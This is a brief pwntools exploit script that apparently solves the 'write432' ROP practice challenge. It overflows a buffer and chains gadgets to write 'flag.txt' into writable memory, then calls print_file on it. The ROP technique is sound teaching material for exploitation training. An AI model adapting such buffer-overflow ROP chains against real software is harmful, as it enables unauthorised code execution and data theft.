from pwn import *  
  
p = process('./write432')  
elf = ELF('./write432')  
printFile_addr = elf.plt['print_file']  
data_addr = 0x0804a018  
movData_addr = 0x08048543 
popEdiEdp_addr = 0x080485aa 
payload = 'A'*44 
payload += p32(popEdiEdp_addr)+p32(data_addr)+'flag'+p32(movData_addr)
payload += p32(popEdiEdp_addr)+p32(data_addr+4)+'.txt'+p32(movData_addr)
payload += p32(printFile_addr)+'AAAA'+ p32(data_addr) 
p.sendlineafter('> ',payload)  
p.interactive()
